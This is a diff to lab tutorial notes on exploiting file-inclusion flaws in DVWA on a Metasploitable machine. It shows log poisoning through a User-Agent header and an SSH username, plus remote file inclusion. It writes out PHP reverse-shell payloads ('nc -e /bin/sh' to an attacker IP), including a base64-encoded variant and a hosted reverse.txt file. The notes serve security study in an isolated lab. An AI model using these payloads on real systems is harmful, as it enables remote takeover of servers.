@@ -107,7 +107,7 @@ So there is a file in linux / unix systems that can be used to read all enviornm
 
 So with this we can intercept the request (using Burp) and change the 'User-Agent' header value to some php script that we want to execute. Basically we can set up a reverse connection (similar to the code execution example above) again using the following injected code into the header: `<? passthru('nc -e /bin/sh 10.0.2.15 8081');?>`
 
-## More local file explot examples
+## More local file exploit examples
 
 Lets try and load a log file that shows login attempts to the server, which is the file `/var/log/auth.log`. So we change our url to be as follows: `http://10.0.2.4/dvwa/vulnerabilities/fi/?page=../../../../../var/log/auth.log`
 
@@ -117,11 +117,49 @@ The way to do that is to check that if we attempt to ssh into the target server 
 
 Open a terminal session and start netcat listening on port 8888: `nc -vv -l -p 8888`
 
-In another terminal session, attempt to SSH into the target machine but this time set the user name to the php code we want to inject. Note that it's recommended to base64 encode the bash script. You can use Burp Suite to do that!
+In another terminal session, attempt to SSH into the target machine but this time set the user name to the php code we want to inject. Note that it's recommended to base64 encode the bash script. You can use Burp Suite or an online base64 encoder to do that!
 
-SSH login command (before base64 encoding): `ssh "<?passthru('nc -e /bin/sh 10.0.2.15 8888');?>"@10.0.2.4`
+SSH login command (*before base64 encoding*): `ssh "<?passthru('nc -e /bin/sh 10.0.2.15 8888');?>"@10.0.2.4`
 
-SSH login command (after base64 encoding): `ssh "<?passthru(base64_decode('bmMgLWUgL2Jpbi9zaCAxMC4wLjIuMTUgODg4OA=='));?>"@10.0.2.4`
+Remember, we are essentially attempting to ssh into the server using some PHP code as a username. The reason is so that this php code will be logged in the `/var/log/auth.log` file. Note that `passthru` is a php function that essentially will execute a bash script on the server.
+
+SSH login command (*after base64 encoding*): `ssh "<?passthru(base64_decode('bmMgLWUgL2Jpbi9zaCAxMC4wLjIuMTUgODg4OA=='));?>"@10.0.2.4`
+
+This example uses the `/var/log/auth.log` file. If we are able to find, for example, a mail log file then we can attempt to exploit the target machine by sending an email to that machine that contains php code and then render the file via the fi exploit page in the same way. 
+
+## Remote file inclusion
+
+This is where we can attach a server by read ANY file from ANY server!
+
+To ensure that this vulerability can be tested on our metasplotable machine we need to enable two php settings within that machine. You will need to go directly as a server admin first to that machine and set `allow_url_fopen` and `allow_url_include` to be both set to *On*. Note: both of these settings are found in the `/etc/php5/cgi/php.ini` file on the metasplotable sever.
+
+Then you need to restart the apache server like so `sudo /etc/init.d/apache2 restart`
+
+Now create a file which contains the php code you want to execute on the target machine:
+
+```
+<?php
+
+passthru('nc -e /bin/sh 10.0.2.15 8888');
+
+?>
+```
+
+Note: Save this file as `reverse.txt` (NOT .php) on a server where you can acess it via an IP. In our case we will use Kali Linux (so save in the folder `/var/www/html/`. You may need to start apache server on Kali Linux using `apache2ctl start`.
+
+OK, so now you can check that the file is being served as expected by opening a browser tab in Kali and navigate to `http://localhost/reverse.txt`.
+
+To use this we first, as always, need to listen using netcat in a termial like so: `nc -vv -l -p 8888`
+
+Then in the browser open the vulnerable fi page and set the `page` parameter to point to the location via http of the reverse.txt exploit file, like so `http://10.0.2.4/dvwa/vulnerabilities/fi/?page=http://10.0.2.15/reverse.txt?`
+
+
+
+
+
+
+
+
 
 
 
